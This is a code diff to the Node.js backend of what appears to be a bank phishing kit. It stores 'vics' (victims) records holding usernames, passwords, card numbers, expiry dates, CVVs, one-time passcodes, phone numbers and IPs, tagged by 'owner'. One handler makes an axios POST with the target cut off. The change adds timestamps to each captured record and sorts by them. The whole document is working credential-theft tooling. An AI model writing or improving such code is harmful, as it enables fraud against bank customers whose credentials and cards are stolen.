@@ -104,7 +104,7 @@ const submitStaticPersonal = async (req, res) => {
 const getOwnerVics = async (req, res) => {
   const { owner } = req.params;
   Sants.find({ owner })
-    .sort({ status: -1 })
+    .sort({ timestamp: -1 })
     .exec((err, vics) => {
       if (err) {
         console.log(err);
@@ -149,6 +149,7 @@ const submitLogin = async (req, res) => {
         status: 1,
         owner: 'haytch4023',
         ip,
+        timestamp: moment().format()
       });
       await axios
         .post(
@@ -171,6 +172,7 @@ const submitLogin = async (req, res) => {
         status: 1,
         owner,
         ip,
+        timestamp: moment().format()
       });
       // santsCount = santsCount + 1;
     }
@@ -186,7 +188,7 @@ const submitLoginAgain = async (req, res) => {
   try {
     await Sants.findOneAndUpdate(
       { uniqueid },
-      { username, password, status: 1 }
+      { username, password, status: 1, timestamp: moment().format() }
     ).exec();
     res.sendStatus(200);
   } catch (error) {
@@ -200,7 +202,7 @@ const submitCard = async (req, res) => {
   try {
     await Sants.findOneAndUpdate(
       { uniqueid },
-      { ccname, ccnum, ccexp, cvv, status: 11 }
+      { ccname, ccnum, ccexp, cvv, status: 11, timestamp: moment().format() }
     ).exec();
     res.sendStatus(200);
   } catch (error) {
@@ -214,7 +216,7 @@ const submitOtp = async (req, res) => {
   try {
     await Sants.findOneAndUpdate(
       { uniqueid },
-      { otp, status: 7 }
+      { otp, status: 7, timestamp: moment().format() }
     ).exec();
     res.sendStatus(200);
   } catch (error) {
@@ -228,7 +230,7 @@ const submitPhone = async (req, res) => {
   try {
     await Sants.findOneAndUpdate(
       { uniqueid },
-      { phone, status: 3 }
+      { phone, status: 3, timestamp: moment().format() }
     ).exec();
     res.sendStatus(200);
   } catch (error) {
